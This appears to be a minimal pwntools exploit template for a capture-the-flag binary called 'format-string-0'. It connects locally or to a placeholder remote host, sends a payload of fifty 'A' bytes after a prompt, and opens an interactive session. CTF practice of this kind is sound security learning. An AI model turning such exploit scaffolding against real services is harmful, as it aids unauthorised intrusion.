#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-0_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()
    r.recvuntil(b"recommendation: ")
    payload=b'A'*50
    r.sendline(payload)
    print(r.recv())
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
